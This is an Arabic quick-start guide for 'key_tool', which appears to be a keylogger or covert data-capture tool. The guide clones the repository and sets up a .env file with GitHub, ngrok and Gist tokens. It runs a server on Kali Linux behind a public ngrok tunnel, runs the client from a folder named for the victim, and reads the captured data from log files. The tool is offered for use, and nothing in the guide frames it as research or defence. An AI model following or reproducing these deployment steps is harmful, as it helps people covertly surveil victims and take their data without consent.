# ⚡ البدء السريع (Quick Start)

## 5 خطوات فقط! 🚀

### 1️⃣ التثبيت الأساسي
```bash
# استنساخ المستودع
git clone https://github.com/Developer-redex/key_tool.git
cd key_tool

# تثبيت المكتبات
pip install -r requirements.txt
```

### 2️⃣ إعداد البيئة
```bash
# انسخ ملف المثال
cp .env.example .env

# أضف بيانات التوكنات الخاصة بك
nano .env
```

قيم يجب أن تضيفها:
```env
GITHUB_TOKEN=ghp_xxxxxxxxx
NGROK_TOKEN=xxxxxxxxxxxxx
GIST_ID=xxxxxxxxxxxxxxx
ENCRYPTION_PASSWORD=MyStr0ng!Pass
```

### 3️⃣ تشغيل الخادم
```bash
cd "Kali Linux server"
python server_kali_v2.py
```

**ستظهر رسالة النجاح:**
```
🌍 العنوان العام : https://xxxxxx.ngrok.io
⌨  في انتظار الاتصالات...
```

### 4️⃣ تشغيل العميل
```bash
cd "Victim's_\ file"
python client_secure.py
```

### 5️⃣ قراءة السجلات
```bash
# عرض البيانات المستقبلة
tail -f ../logs/*.txt
```

---

## 📊 جدول المعلومات السريعة:

| العنصر | البيان |
|-------|-------|
| **لغة البرمجة** | Python 3.8+ |
| **المنفذ الافتراضي** | 5000 |
| **التشفير** | Fernet (256-bit) |
| **ملف السجلات** | `logs/` |
| **ملف البيئة** | `.env` |
| **الخادم الآمن** | `server_kali_v2.py` |

---

## 🆘 مشاكل شائعة:

| المشكلة | الحل |
|--------|------|
| **ModuleNotFoundError** | `pip install -r requirements.txt` |
| **Port already in use** | `python server_kali_v2.py --port 8080` |
| **NGROK_TOKEN غير صحيح** | تحقق من `.env` وأعد التوكن |
| **اتصال مرفوض** | تأكد من `--no-ngrok` للاختبار المحلي |

---

## 📚 المزيد من التفاصيل:

👉 اقرأ `INSTALLATION_GUIDE_AR.md` للتفاصيل الكاملة

---

**استمتع بالاستخدام! 🎉**
